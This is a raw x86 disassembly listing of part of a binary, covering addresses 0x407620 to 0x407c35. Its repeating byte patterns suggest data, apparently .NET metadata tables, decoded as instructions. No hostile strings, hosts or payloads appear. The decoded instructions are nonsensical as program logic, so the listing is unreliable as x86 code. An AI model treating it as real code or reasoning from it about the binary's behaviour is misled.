  407620:	71 00                	jno    0x407622
  407622:	06                   	push   %es
  407623:	00 b7 12 74 00 06    	add    %dh,0x6007412(%edi)
  407629:	00 ed                	add    %ch,%ch
  40762b:	15 d0 00 01 00       	adc    $0x100d0,%eax
  407630:	72 01                	jb     0x407633
  407632:	87 00                	xchg   %eax,(%eax)
  407634:	01 00                	add    %eax,(%eax)
  407636:	8c 02                	mov    %es,(%edx)
  407638:	96                   	xchg   %eax,%esi
  407639:	00 06                	add    %al,(%esi)
  40763b:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  40763e:	71 00                	jno    0x407640
  407640:	06                   	push   %es
  407641:	00 b7 12 74 00 06    	add    %dh,0x6007412(%edi)
  407647:	00 4b 14             	add    %cl,0x14(%ebx)
  40764a:	78 00                	js     0x40764c
  40764c:	06                   	push   %es
  40764d:	00 ed                	add    %ch,%ch
  40764f:	15 d0 00 01 00       	adc    $0x100d0,%eax
  407654:	78 02                	js     0x407658
  407656:	80 00 01             	addb   $0x1,(%eax)
  407659:	00 df                	add    %bl,%bh
  40765b:	02 80 00 01 00 72    	add    0x72000100(%eax),%al
  407661:	01 96 00 01 00 8c    	add    %edx,-0x73ffff00(%esi)
  407667:	02 87 00 01 00 36    	add    0x36000100(%edi),%al
  40766d:	03 8f 00 06 00 2c    	add    0x2c000600(%edi),%ecx
  407673:	0a 71 00             	or     0x0(%ecx),%dh
  407676:	06                   	push   %es
  407677:	00 b7 12 74 00 06    	add    %dh,0x6007412(%edi)
  40767d:	00 4b 14             	add    %cl,0x14(%ebx)
  407680:	78 00                	js     0x407682
  407682:	06                   	push   %es
  407683:	00 67 06             	add    %ah,0x6(%edi)
  407686:	80 00 01             	addb   $0x1,(%eax)
  407689:	00 72 01             	add    %dh,0x1(%edx)
  40768c:	8f 00                	pop    (%eax)
  40768e:	06                   	push   %es
  40768f:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407692:	71 00                	jno    0x407694
  407694:	06                   	push   %es
  407695:	00 b7 12 74 00 06    	add    %dh,0x6007412(%edi)
  40769b:	00 4b 14             	add    %cl,0x14(%ebx)
  40769e:	78 00                	js     0x4076a0
  4076a0:	06                   	push   %es
  4076a1:	00 ed                	add    %ch,%ch
  4076a3:	15 d0 00 01 00       	adc    $0x100d0,%eax
  4076a8:	72 01                	jb     0x4076ab
  4076aa:	87 00                	xchg   %eax,(%eax)
  4076ac:	01 00                	add    %eax,(%eax)
  4076ae:	8c 02                	mov    %es,(%edx)
  4076b0:	96                   	xchg   %eax,%esi
  4076b1:	00 06                	add    %al,(%esi)
  4076b3:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  4076b6:	71 00                	jno    0x4076b8
  4076b8:	06                   	push   %es
  4076b9:	00 b7 12 74 00 06    	add    %dh,0x6007412(%edi)
  4076bf:	00 67 06             	add    %ah,0x6(%edi)
  4076c2:	80 00 06             	addb   $0x6,(%eax)
  4076c5:	00 4b 14             	add    %cl,0x14(%ebx)
  4076c8:	78 00                	js     0x4076ca
  4076ca:	06                   	push   %es
  4076cb:	00 ed                	add    %ch,%ch
  4076cd:	15 d0 00 01 00       	adc    $0x100d0,%eax
  4076d2:	72 01                	jb     0x4076d5
  4076d4:	8f 00                	pop    (%eax)
  4076d6:	06                   	push   %es
  4076d7:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  4076da:	71 00                	jno    0x4076dc
  4076dc:	06                   	push   %es
  4076dd:	00 b7 12 74 00 06    	add    %dh,0x6007412(%edi)
  4076e3:	00 31                	add    %dh,(%ecx)
  4076e5:	08 78 00             	or     %bh,0x0(%eax)
  4076e8:	01 00                	add    %eax,(%eax)
  4076ea:	47                   	inc    %edi
  4076eb:	02 5f 00             	add    0x0(%edi),%bl
  4076ee:	01 00                	add    %eax,(%eax)
  4076f0:	72 01                	jb     0x4076f3
  4076f2:	dc 00                	faddl  (%eax)
  4076f4:	01 00                	add    %eax,(%eax)
  4076f6:	8c 02                	mov    %es,(%edx)
  4076f8:	e3 00                	jecxz  0x4076fa
  4076fa:	01 00                	add    %eax,(%eax)
  4076fc:	36 03 8f 00 01 00 39 	add    %ss:0x39000100(%edi),%ecx
  407703:	17                   	pop    %ss
  407704:	ea 00 06 00 37 15 f2 	ljmp   $0xf215,$0x37000600
  40770b:	00 06                	add    %al,(%esi)
  40770d:	00 e3                	add    %ah,%bl
  40770f:	0e                   	push   %cs
  407710:	fa                   	cli
  407711:	00 06                	add    %al,(%esi)
  407713:	00 17                	add    %dl,(%edi)
  407715:	18 78 00             	sbb    %bh,0x0(%eax)
  407718:	06                   	push   %es
  407719:	00 19                	add    %bl,(%ecx)
  40771b:	06                   	push   %es
  40771c:	71 00                	jno    0x40771e
  40771e:	06                   	push   %es
  40771f:	00 53 07             	add    %dl,0x7(%ebx)
  407722:	71 00                	jno    0x407724
  407724:	06                   	push   %es
  407725:	00 b7 09 71 00 06    	add    %dh,0x6007109(%edi)
  40772b:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  40772e:	71 00                	jno    0x407730
  407730:	06                   	push   %es
  407731:	00 b7 12 57 01 06    	add    %dh,0x6015712(%edi)
  407737:	00 ed                	add    %ch,%ch
  407739:	15 78 00 01 00       	adc    $0x10078,%eax
  40773e:	72 01                	jb     0x407741
  407740:	96                   	xchg   %eax,%esi
  407741:	00 06                	add    %al,(%esi)
  407743:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407746:	71 00                	jno    0x407748
  407748:	06                   	push   %es
  407749:	00 b7 12 5b 01 06    	add    %dh,0x6015b12(%edi)
  40774f:	00 ed                	add    %ch,%ch
  407751:	15 78 00 06 00       	adc    $0x60078,%eax
  407756:	e0 09                	loopne 0x407761
  407758:	71 00                	jno    0x40775a
  40775a:	06                   	push   %es
  40775b:	00 39                	add    %bh,(%ecx)
  40775d:	17                   	pop    %ss
  40775e:	ea 00 06 00 b8 07 71 	ljmp   $0x7107,$0xb8000600
  407765:	00 01                	add    %al,(%ecx)
  407767:	00 6b 02             	add    %ch,0x2(%ebx)
  40776a:	63 01                	arpl   %eax,(%ecx)
  40776c:	01 00                	add    %eax,(%eax)
  40776e:	c9                   	leave
  40776f:	02 78 00             	add    0x0(%eax),%bh
  407772:	01 00                	add    %eax,(%eax)
  407774:	72 01                	jb     0x407777
  407776:	96                   	xchg   %eax,%esi
  407777:	00 01                	add    %al,(%ecx)
  407779:	00 8c 02 d4 00 01 00 	add    %cl,0x100d4(%edx,%eax,1)
  407780:	36 03 8f 00 06 00 2c 	add    %ss:0x2c000600(%edi),%ecx
  407787:	0a 71 00             	or     0x0(%ecx),%dh
  40778a:	06                   	push   %es
  40778b:	00 b7 12 67 01 06    	add    %dh,0x6016712(%edi)
  407791:	00 ed                	add    %ch,%ch
  407793:	15 78 00 01 00       	adc    $0x10078,%eax
  407798:	72 01                	jb     0x40779b
  40779a:	87 00                	xchg   %eax,(%eax)
  40779c:	06                   	push   %es
  40779d:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  4077a0:	71 00                	jno    0x4077a2
  4077a2:	06                   	push   %es
  4077a3:	00 b7 12 6f 01 06    	add    %dh,0x6016f12(%edi)
  4077a9:	00 ed                	add    %ch,%ch
  4077ab:	15 78 00 06 00       	adc    $0x60078,%eax
  4077b0:	67 06                	addr16 push %es
  4077b2:	80 00 01             	addb   $0x1,(%eax)
  4077b5:	00 72 01             	add    %dh,0x1(%edx)
  4077b8:	8f 00                	pop    (%eax)
  4077ba:	06                   	push   %es
  4077bb:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  4077be:	71 00                	jno    0x4077c0
  4077c0:	06                   	push   %es
  4077c1:	00 b7 12 6f 01 06    	add    %dh,0x6016f12(%edi)
  4077c7:	00 ed                	add    %ch,%ch
  4077c9:	15 78 00 06 00       	adc    $0x60078,%eax
  4077ce:	e0 09                	loopne 0x4077d9
  4077d0:	71 00                	jno    0x4077d2
  4077d2:	06                   	push   %es
  4077d3:	00 bb 07 71 00 01    	add    %bh,0x1007107(%ebx)
  4077d9:	00 60 02             	add    %ah,0x2(%eax)
  4077dc:	80 00 01             	addb   $0x1,(%eax)
  4077df:	00 72 01             	add    %dh,0x1(%edx)
  4077e2:	87 00                	xchg   %eax,(%eax)
  4077e4:	01 00                	add    %eax,(%eax)
  4077e6:	8c 02                	mov    %es,(%edx)
  4077e8:	8f 00                	pop    (%eax)
  4077ea:	06                   	push   %es
  4077eb:	00 78 07             	add    %bh,0x7(%eax)
  4077ee:	76 01                	jbe    0x4077f1
  4077f0:	06                   	push   %es
  4077f1:	00 02                	add    %al,(%edx)
  4077f3:	0d 71 00 06 00       	or     $0x60071,%eax
  4077f8:	73 17                	jae    0x407811
  4077fa:	71 00                	jno    0x4077fc
  4077fc:	06                   	push   %es
  4077fd:	00 e3                	add    %ah,%bl
  4077ff:	0e                   	push   %cs
  407800:	63 01                	arpl   %eax,(%ecx)
  407802:	06                   	push   %es
  407803:	00 4f 1a             	add    %cl,0x1a(%edi)
  407806:	80 00 01             	addb   $0x1,(%eax)
  407809:	00 03                	add    %al,(%ebx)
  40780b:	19 71 00             	sbb    %esi,0x0(%ecx)
  40780e:	06                   	push   %es
  40780f:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407812:	71 00                	jno    0x407814
  407814:	06                   	push   %es
  407815:	00 b7 12 67 01 06    	add    %dh,0x6016712(%edi)
  40781b:	00 80 0d 71 00 06    	add    %al,0x600710d(%eax)
  407821:	00 ed                	add    %ch,%ch
  407823:	15 fa 00 01 00       	adc    $0x100fa,%eax
  407828:	1d 02 80 00 01       	sbb    $0x1008002,%eax
  40782d:	00 d3                	add    %dl,%bl
  40782f:	02 71 00             	add    0x0(%ecx),%dh
  407832:	01 00                	add    %eax,(%eax)
  407834:	ad                   	lods   %ds:(%esi),%eax
  407835:	03 71 00             	add    0x0(%ecx),%esi
  407838:	01 00                	add    %eax,(%eax)
  40783a:	72 01                	jb     0x40783d
  40783c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40783d:	01 06                	add    %eax,(%esi)
  40783f:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407842:	71 00                	jno    0x407844
  407844:	06                   	push   %es
  407845:	00 b7 12 67 01 06    	add    %dh,0x6016712(%edi)
  40784b:	00 80 0d 71 00 06    	add    %al,0x600710d(%eax)
  407851:	00 ed                	add    %ch,%ch
  407853:	15 fa 00 01 00       	adc    $0x100fa,%eax
  407858:	1d 02 80 00 01       	sbb    $0x1008002,%eax
  40785d:	00 d3                	add    %dl,%bl
  40785f:	02 71 00             	add    0x0(%ecx),%dh
  407862:	01 00                	add    %eax,(%eax)
  407864:	ad                   	lods   %ds:(%esi),%eax
  407865:	03 71 00             	add    0x0(%ecx),%esi
  407868:	01 00                	add    %eax,(%eax)
  40786a:	12 04 ae             	adc    (%esi,%ebp,4),%al
  40786d:	01 01                	add    %eax,(%ecx)
  40786f:	00 7a 04             	add    %bh,0x4(%edx)
  407872:	ae                   	scas   %es:(%edi),%al
  407873:	01 01                	add    %eax,(%ecx)
  407875:	00 72 01             	add    %dh,0x1(%edx)
  407878:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407879:	01 01                	add    %eax,(%ecx)
  40787b:	00 8c 02 96 00 36 00 	add    %cl,0x360096(%edx,%eax,1)
  407882:	80 05 b2 01 16 00 8a 	addb   $0x8a,0x1601b2
  407889:	00 b6 01 06 00 2c    	add    %dh,0x2c000601(%esi)
  40788f:	0a 71 00             	or     0x0(%ecx),%dh
  407892:	06                   	push   %es
  407893:	00 b7 12 6f 01 06    	add    %dh,0x6016f12(%edi)
  407899:	00 67 06             	add    %ah,0x6(%edi)
  40789c:	80 00 06             	addb   $0x6,(%eax)
  40789f:	00 ed                	add    %ch,%ch
  4078a1:	15 fa 00 01 00       	adc    $0x100fa,%eax
  4078a6:	72 01                	jb     0x4078a9
  4078a8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4078a9:	01 06                	add    %eax,(%esi)
  4078ab:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  4078ae:	71 00                	jno    0x4078b0
  4078b0:	06                   	push   %es
  4078b1:	00 b7 12 67 01 06    	add    %dh,0x6016712(%edi)
  4078b7:	00 ed                	add    %ch,%ch
  4078b9:	15 fa 00 01 00       	adc    $0x100fa,%eax
  4078be:	72 01                	jb     0x4078c1
  4078c0:	87 00                	xchg   %eax,(%eax)
  4078c2:	11 00                	adc    %eax,(%eax)
  4078c4:	4e                   	dec    %esi
  4078c5:	14 78                	adc    $0x78,%al
  4078c7:	00 11                	add    %dl,(%ecx)
  4078c9:	00 f2                	add    %dh,%dl
  4078cb:	13 7c 00 11          	adc    0x11(%eax,%eax,1),%edi
  4078cf:	00 ed                	add    %ch,%ch
  4078d1:	11 5f 00             	adc    %ebx,0x0(%edi)
  4078d4:	11 00                	adc    %eax,(%eax)
  4078d6:	a3 18 71 00 11       	mov    %eax,0x11007118
  4078db:	00 4f 1a             	add    %cl,0x1a(%edi)
  4078de:	80 00 11             	addb   $0x11,(%eax)
  4078e1:	00 09                	add    %cl,(%ecx)
  4078e3:	1a 71 00             	sbb    0x0(%ecx),%dh
  4078e6:	11 00                	adc    %eax,(%eax)
  4078e8:	0c 0e                	or     $0xe,%al
  4078ea:	5f                   	pop    %edi
  4078eb:	00 11                	add    %dl,(%ecx)
  4078ed:	00 16                	add    %dl,(%esi)
  4078ef:	12 71 00             	adc    0x0(%ecx),%dh
  4078f2:	11 00                	adc    %eax,(%eax)
  4078f4:	5b                   	pop    %ebx
  4078f5:	0e                   	push   %cs
  4078f6:	5f                   	pop    %edi
  4078f7:	00 11                	add    %dl,(%ecx)
  4078f9:	00 33                	add    %dh,(%ebx)
  4078fb:	09 5f 00             	or     %ebx,0x0(%edi)
  4078fe:	16                   	push   %ss
  4078ff:	00 23                	add    %ah,(%ebx)
  407901:	0e                   	push   %cs
  407902:	d1 01                	roll   $1,(%ecx)
  407904:	06                   	push   %es
  407905:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407908:	71 00                	jno    0x40790a
  40790a:	06                   	push   %es
  40790b:	00 b7 12 74 00 01    	add    %dh,0x1007412(%edi)
  407911:	00 72 01             	add    %dh,0x1(%edx)
  407914:	96                   	xchg   %eax,%esi
  407915:	00 01                	add    %al,(%ecx)
  407917:	00 8c 02 8f 00 01 00 	add    %cl,0x1008f(%edx,%eax,1)
  40791e:	de 01                	fiadds (%ecx)
  407920:	84 00                	test   %al,(%eax)
  407922:	01 00                	add    %eax,(%eax)
  407924:	aa                   	stos   %al,%es:(%edi)
  407925:	02 71 00             	add    0x0(%ecx),%dh
  407928:	01 00                	add    %eax,(%eax)
  40792a:	a0 03 63 01 01       	mov    0x1016303,%al
  40792f:	00 36                	add    %dh,(%esi)
  407931:	03 d4                	add    %esp,%edx
  407933:	00 01                	add    %al,(%ecx)
  407935:	00 0a                	add    %cl,(%edx)
  407937:	04 9a                	add    $0x9a,%al
  407939:	00 21                	add    %ah,(%ecx)
  40793b:	00 bd 18 ef 01 06    	add    %bh,0x601ef18(%ebp)
  407941:	00 c6                	add    %al,%dh
  407943:	0c a6                	or     $0xa6,%al
  407945:	02 06                	add    (%esi),%al
  407947:	00 55 09             	add    %dl,0x9(%ebp)
  40794a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40794b:	02 36                	add    (%esi),%dh
  40794d:	00 80 05 a9 02 16    	add    %al,0x1602a905(%eax)
  407953:	00 b8 00 ae 02 16    	add    %bh,0x1602ae00(%eax)
  407959:	00 50 00             	add    %dl,0x0(%eax)
  40795c:	b5 02                	mov    $0x2,%ch
  40795e:	06                   	push   %es
  40795f:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407962:	71 00                	jno    0x407964
  407964:	06                   	push   %es
  407965:	00 b7 12 c0 02 01    	add    %dh,0x102c012(%edi)
  40796b:	00 72 01             	add    %dh,0x1(%edx)
  40796e:	dc 00                	faddl  (%eax)
  407970:	06                   	push   %es
  407971:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407974:	71 00                	jno    0x407976
  407976:	06                   	push   %es
  407977:	00 b7 12 5b 01 06    	add    %dh,0x6015b12(%edi)
  40797d:	00 e3                	add    %ah,%bl
  40797f:	0e                   	push   %cs
  407980:	63 01                	arpl   %eax,(%ecx)
  407982:	06                   	push   %es
  407983:	00 75 1a             	add    %dh,0x1a(%ebp)
  407986:	80 00 06             	addb   $0x6,(%eax)
  407989:	00 39                	add    %bh,(%ecx)
  40798b:	17                   	pop    %ss
  40798c:	ea 00 06 00 e0 09 71 	ljmp   $0x7109,$0xe0000600
  407993:	00 06                	add    %al,(%esi)
  407995:	00 19                	add    %bl,(%ecx)
  407997:	06                   	push   %es
  407998:	71 00                	jno    0x40799a
  40799a:	01 00                	add    %eax,(%eax)
  40799c:	55                   	push   %ebp
  40799d:	02 78 00             	add    0x0(%eax),%bh
  4079a0:	01 00                	add    %eax,(%eax)
  4079a2:	72 01                	jb     0x4079a5
  4079a4:	8f 00                	pop    (%eax)
  4079a6:	06                   	push   %es
  4079a7:	00 4c 0e 5f          	add    %cl,0x5f(%esi,%ecx,1)
  4079ab:	00 06                	add    %al,(%esi)
  4079ad:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  4079b0:	71 00                	jno    0x4079b2
  4079b2:	06                   	push   %es
  4079b3:	00 b7 12 74 00 06    	add    %dh,0x6007412(%edi)
  4079b9:	00 4c 0e 5f          	add    %cl,0x5f(%esi,%ecx,1)
  4079bd:	00 01                	add    %al,(%ecx)
  4079bf:	00 72 01             	add    %dh,0x1(%edx)
  4079c2:	96                   	xchg   %eax,%esi
  4079c3:	00 06                	add    %al,(%esi)
  4079c5:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  4079c8:	71 00                	jno    0x4079ca
  4079ca:	06                   	push   %es
  4079cb:	00 b7 12 74 00 01    	add    %dh,0x1007412(%edi)
  4079d1:	00 72 01             	add    %dh,0x1(%edx)
  4079d4:	96                   	xchg   %eax,%esi
  4079d5:	00 06                	add    %al,(%esi)
  4079d7:	00 3b                	add    %bh,(%ebx)
  4079d9:	09 5f 00             	or     %ebx,0x0(%edi)
  4079dc:	06                   	push   %es
  4079dd:	00 4c 0e 5f          	add    %cl,0x5f(%esi,%ecx,1)
  4079e1:	00 06                	add    %al,(%esi)
  4079e3:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  4079e6:	71 00                	jno    0x4079e8
  4079e8:	06                   	push   %es
  4079e9:	00 b7 12 6f 01 06    	add    %dh,0x6016f12(%edi)
  4079ef:	00 3b                	add    %bh,(%ebx)
  4079f1:	09 5f 00             	or     %ebx,0x0(%edi)
  4079f4:	06                   	push   %es
  4079f5:	00 4c 0e 5f          	add    %cl,0x5f(%esi,%ecx,1)
  4079f9:	00 01                	add    %al,(%ecx)
  4079fb:	00 72 01             	add    %dh,0x1(%edx)
  4079fe:	8f 00                	pop    (%eax)
  407a00:	06                   	push   %es
  407a01:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407a04:	71 00                	jno    0x407a06
  407a06:	06                   	push   %es
  407a07:	00 b7 12 6f 01 06    	add    %dh,0x6016f12(%edi)
  407a0d:	00 4c 0e 5f          	add    %cl,0x5f(%esi,%ecx,1)
  407a11:	00 06                	add    %al,(%esi)
  407a13:	00 3b                	add    %bh,(%ebx)
  407a15:	09 5f 00             	or     %ebx,0x0(%edi)
  407a18:	01 00                	add    %eax,(%eax)
  407a1a:	28 02                	sub    %al,(%edx)
  407a1c:	5f                   	pop    %edi
  407a1d:	00 01                	add    %al,(%ecx)
  407a1f:	00 ff                	add    %bh,%bh
  407a21:	02 c7                	add    %bh,%al
  407a23:	02 01                	add    (%ecx),%al
  407a25:	00 72 01             	add    %dh,0x1(%edx)
  407a28:	96                   	xchg   %eax,%esi
  407a29:	00 06                	add    %al,(%esi)
  407a2b:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407a2e:	71 00                	jno    0x407a30
  407a30:	06                   	push   %es
  407a31:	00 b7 12 cb 02 01    	add    %dh,0x102cb12(%edi)
  407a37:	00 72 01             	add    %dh,0x1(%edx)
  407a3a:	e3 00                	jecxz  0x407a3c
  407a3c:	33 01                	xor    (%ecx),%eax
  407a3e:	4e                   	dec    %esi
  407a3f:	03 d2                	add    %edx,%edx
  407a41:	02 33                	add    (%ebx),%dh
  407a43:	01 d6                	add    %edx,%esi
  407a45:	05 d7 02 00 00       	add    $0x2d7,%eax
  407a4a:	00 00                	add    %al,(%eax)
  407a4c:	80 00 91             	addb   $0x91,(%eax)
  407a4f:	20 e3                	and    %ah,%bl
  407a51:	0c 13                	or     $0x13,%al
  407a53:	00 01                	add    %al,(%ecx)
  407a55:	00 00                	add    %al,(%eax)
  407a57:	00 00                	add    %al,(%eax)
  407a59:	00 80 00 91 20 62    	add    %al,0x62209100(%eax)
  407a5f:	13 1c 00             	adc    (%eax,%eax,1),%ebx
  407a62:	04 00                	add    $0x0,%al
  407a64:	00 00                	add    %al,(%eax)
  407a66:	00 00                	add    %al,(%eax)
  407a68:	80 00 91             	addb   $0x91,(%eax)
  407a6b:	20 50 13             	and    %dl,0x13(%eax)
  407a6e:	29 00                	sub    %eax,(%eax)
  407a70:	0a 00                	or     (%eax),%al
  407a72:	00 00                	add    %al,(%eax)
  407a74:	00 00                	add    %al,(%eax)
  407a76:	80 00 91             	addb   $0x91,(%eax)
  407a79:	20 2c 07             	and    %ch,(%edi,%eax,1)
  407a7c:	38 00                	cmp    %al,(%eax)
  407a7e:	12 00                	adc    (%eax),%al
  407a80:	00 00                	add    %al,(%eax)
  407a82:	00 00                	add    %al,(%eax)
  407a84:	80 00 91             	addb   $0x91,(%eax)
  407a87:	20 36                	and    %dh,(%esi)
  407a89:	08 3e                	or     %bh,(%esi)
  407a8b:	00 14 00             	add    %dl,(%eax,%eax,1)
  407a8e:	d0 23                	shlb   $1,(%ebx)
  407a90:	00 00                	add    %al,(%eax)
  407a92:	00 00                	add    %al,(%eax)
  407a94:	96                   	xchg   %eax,%esi
  407a95:	00 7d 16             	add    %bh,0x16(%ebp)
  407a98:	43                   	inc    %ebx
  407a99:	00 15 00 44 24 00    	add    %dl,0x244400
  407a9f:	00 00                	add    %al,(%eax)
  407aa1:	00 96 00 86 16 4a    	add    %dl,0x4a168600(%esi)
  407aa7:	00 16                	add    %dl,(%esi)
  407aa9:	00 78 20             	add    %bh,0x20(%eax)
  407aac:	00 00                	add    %al,(%eax)
  407aae:	00 00                	add    %al,(%eax)
  407ab0:	86 18                	xchg   %bl,(%eax)
  407ab2:	88 14 52             	mov    %dl,(%edx,%edx,2)
  407ab5:	00 18                	add    %bl,(%eax)
  407ab7:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  407abd:	00 86 18 88 14 52    	add    %al,0x52148818(%esi)
  407ac3:	00 18                	add    %bl,(%eax)
  407ac5:	00 6c 24 00          	add    %ch,0x0(%esp)
  407ac9:	00 00                	add    %al,(%eax)
  407acb:	00 86 00 96 13 62    	add    %al,0x62139600(%esi)
  407ad1:	00 18                	add    %bl,(%eax)
  407ad3:	00 b4 20 00 00 00 00 	add    %dh,0x0(%eax,%eiz,1)
  407ada:	91                   	xchg   %eax,%ecx
  407adb:	00 8d 0c 69 00 19    	add    %cl,0x1900690c(%ebp)
  407ae1:	00 b8 24 00 00 00    	add    %bh,0x24(%eax)
  407ae7:	00 e1                	add    %ah,%cl
  407ae9:	01 63 19             	add    %esp,0x19(%ebx)
  407aec:	52                   	push   %edx
  407aed:	00 1b                	add    %bl,(%ebx)
  407aef:	00 d9                	add    %bl,%cl
  407af1:	20 00                	and    %al,(%eax)
  407af3:	00 00                	add    %al,(%eax)
  407af5:	00 e1                	add    %ah,%cl
  407af7:	01 90 09 9e 00 1b    	add    %edx,0x1b009e09(%eax)
  407afd:	00 b0 29 00 00 00    	add    %dh,0x29(%eax)
  407b03:	00 96 00 8d 18 a4    	add    %dl,-0x5be77300(%esi)
  407b09:	00 1c 00             	add    %bl,(%eax,%eax,1)
  407b0c:	70 2a                	jo     0x407b38
  407b0e:	00 00                	add    %al,(%eax)
  407b10:	00 00                	add    %al,(%eax)
  407b12:	96                   	xchg   %eax,%esi
  407b13:	00 85 18 a4 00 1e    	add    %al,0x1e00a418(%ebp)
  407b19:	00 78 20             	add    %bh,0x20(%eax)
  407b1c:	00 00                	add    %al,(%eax)
  407b1e:	00 00                	add    %al,(%eax)
  407b20:	86 18                	xchg   %bl,(%eax)
  407b22:	88 14 52             	mov    %dl,(%edx,%edx,2)
  407b25:	00 20                	add    %ah,(%eax)
  407b27:	00 e7                	add    %ah,%bh
  407b29:	20 00                	and    %al,(%eax)
  407b2b:	00 00                	add    %al,(%eax)
  407b2d:	00 86 18 88 14 ad    	add    %al,-0x52eb77e8(%esi)
  407b33:	00 20                	add    %ah,(%eax)
  407b35:	00 30                	add    %dh,(%eax)
  407b37:	2b 00                	sub    (%eax),%eax
  407b39:	00 00                	add    %al,(%eax)
  407b3b:	00 86 00 c4 0e b5    	add    %al,-0x4af13c00(%esi)
  407b41:	00 22                	add    %ah,(%edx)
  407b43:	00 fd                	add    %bh,%ch
  407b45:	20 00                	and    %al,(%eax)
  407b47:	00 00                	add    %al,(%eax)
  407b49:	00 81 00 39 17 bc    	add    %al,-0x43e8c700(%ecx)
  407b4f:	00 23                	add    %ah,(%ebx)
  407b51:	00 7c 2b 00          	add    %bh,0x0(%ebx,%ebp,1)
  407b55:	00 00                	add    %al,(%eax)
  407b57:	00 81 00 7c 11 62    	add    %al,0x62117c00(%ecx)
  407b5d:	00 24 00             	add    %ah,(%eax,%eax,1)
  407b60:	c0 2b 00             	shrb   $0x0,(%ebx)
  407b63:	00 00                	add    %al,(%eax)
  407b65:	00 86 00 52 0c c2    	add    %al,-0x3df3ae00(%esi)
  407b6b:	00 25 00 04 2c 00    	add    %ah,0x2c0400
  407b71:	00 00                	add    %al,(%eax)
  407b73:	00 86 00 5f 0c 62    	add    %al,0x620c5f00(%esi)
  407b79:	00 25 00 50 2c 00    	add    %ah,0x2c5000
  407b7f:	00 00                	add    %al,(%eax)
  407b81:	00 81 00 50 07 c7    	add    %al,-0x38f8b000(%ecx)
  407b87:	00 26                	add    %ah,(%esi)
  407b89:	00 9c 2c 00 00 00 00 	add    %bl,0x0(%esp,%ebp,1)
  407b90:	86 00                	xchg   %al,(%eax)
  407b92:	6c                   	insb   (%dx),%es:(%edi)
  407b93:	0c 62                	or     $0x62,%al
  407b95:	00 28                	add    %ch,(%eax)
  407b97:	00 e8                	add    %ch,%al
  407b99:	2c 00                	sub    $0x0,%al
  407b9b:	00 00                	add    %al,(%eax)
  407b9d:	00 86 00 98 19 c7    	add    %al,-0x38e66800(%esi)
  407ba3:	00 29                	add    %ch,(%ecx)
  407ba5:	00 3c 2d 00 00 00 00 	add    %bh,0x0(,%ebp,1)
  407bac:	86 00                	xchg   %al,(%eax)
  407bae:	96                   	xchg   %eax,%esi
  407baf:	11 62 00             	adc    %esp,0x0(%edx)
  407bb2:	2b 00                	sub    (%eax),%eax
  407bb4:	80 2d 00 00 00 00 e1 	subb   $0xe1,0x0
  407bbb:	01 63 19             	add    %esp,0x19(%ebx)
  407bbe:	52                   	push   %edx
  407bbf:	00 2c 00             	add    %ch,(%eax,%eax,1)
  407bc2:	ff 20                	jmp    *(%eax)
  407bc4:	00 00                	add    %al,(%eax)
  407bc6:	00 00                	add    %al,(%eax)
  407bc8:	e1 01                	loope  0x407bcb
  407bca:	90                   	nop
  407bcb:	09 9e 00 2c 00 c0    	or     %ebx,-0x3fffd400(%esi)
  407bd1:	2f                   	das
  407bd2:	00 00                	add    %al,(%eax)
  407bd4:	00 00                	add    %al,(%eax)
  407bd6:	e1 01                	loope  0x407bd9
  407bd8:	63 19                	arpl   %ebx,(%ecx)
  407bda:	52                   	push   %edx
  407bdb:	00 2d 00 0d 21 00    	add    %ch,0x210d00
  407be1:	00 00                	add    %al,(%eax)
  407be3:	00 e1                	add    %ah,%cl
  407be5:	01 90 09 9e 00 2d    	add    %edx,0x2d009e09(%eax)
  407beb:	00 34 31             	add    %dh,(%ecx,%esi,1)
  407bee:	00 00                	add    %al,(%eax)
  407bf0:	00 00                	add    %al,(%eax)
  407bf2:	e1 01                	loope  0x407bf5
  407bf4:	63 19                	arpl   %ebx,(%ecx)
  407bf6:	52                   	push   %edx
  407bf7:	00 2e                	add    %ch,(%esi)
  407bf9:	00 1b                	add    %bl,(%ebx)
  407bfb:	21 00                	and    %eax,(%eax)
  407bfd:	00 00                	add    %al,(%eax)
  407bff:	00 e1                	add    %ah,%cl
  407c01:	01 90 09 9e 00 2e    	add    %edx,0x2e009e09(%eax)
  407c07:	00 50 33             	add    %dl,0x33(%eax)
  407c0a:	00 00                	add    %al,(%eax)
  407c0c:	00 00                	add    %al,(%eax)
  407c0e:	e1 01                	loope  0x407c11
  407c10:	63 19                	arpl   %ebx,(%ecx)
  407c12:	52                   	push   %edx
  407c13:	00 2f                	add    %ch,(%edi)
  407c15:	00 29                	add    %ch,(%ecx)
  407c17:	21 00                	and    %eax,(%eax)
  407c19:	00 00                	add    %al,(%eax)
  407c1b:	00 e1                	add    %ah,%cl
  407c1d:	01 90 09 9e 00 2f    	add    %edx,0x2f009e09(%eax)
  407c23:	00 f8                	add    %bh,%al
  407c25:	35 00 00 00 00       	xor    $0x0,%eax
  407c2a:	e1 01                	loope  0x407c2d
  407c2c:	63 19                	arpl   %ebx,(%ecx)
  407c2e:	52                   	push   %edx
  407c2f:	00 30                	add    %dh,(%eax)
  407c31:	00 37                	add    %dh,(%edi)
  407c33:	21 00                	and    %eax,(%eax)
  407c35:	00 00                	add    %al,(%eax)
